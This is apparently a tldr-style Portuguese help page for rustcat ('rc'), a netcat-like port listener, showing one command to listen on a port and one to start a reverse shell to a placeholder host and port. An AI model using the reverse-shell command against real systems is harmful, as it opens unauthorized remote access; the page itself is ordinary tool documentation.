# rc

> Um ouvinte de porta moderno e simplista e shell reverso.
> Similar a `nc`.
> Mais informações: <https://github.com/robiot/rustcat/wiki/Basic-Usage>.

- Começa a escutar em uma porta específica:

`rc -lp {{porta}}`

- Começa um shell reverso:

`rc {{host}} {{porta}} -r {{shell}}`
